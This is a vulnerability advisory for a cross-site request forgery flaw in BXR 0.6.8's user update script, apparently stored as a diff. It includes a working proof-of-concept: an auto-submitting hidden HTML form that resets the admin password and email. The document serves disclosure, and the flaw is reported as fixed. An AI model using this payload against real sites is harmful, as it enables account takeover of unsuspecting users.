@@ -1,0 +1,34 @@
+Vulnerability ID: HTB22503
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_bxr.html
+Product: BXR
+Vendor: Hulihan Applications ( http://hulihanapplications.com/projects/bxr )
+Vulnerable Version: 0.6.8 and Probably Prior Versions
+Vendor Notification: 22 July 2010
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Fixed by Vendor
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/user/update" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/user/update/1" method="post" name="main" >
+
+<input type="hidden" name="user[name]" value="admin" />
+<input type="hidden" name="user[email]" value="myemail (at) example (dot) com [email concealed]" />
+<input type="hidden" name="user[password]" value="123" />
+<input type="hidden" name="user[password_confirmation]" value="123" />
+<input type="hidden" name="belongs_to_group[1]" value="yes" />
+<input type="hidden" name="user[default_folder_id]" value="1" />
+<input type="hidden" name="commit" value="Save" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+Solution: Upgrade to the most recent version
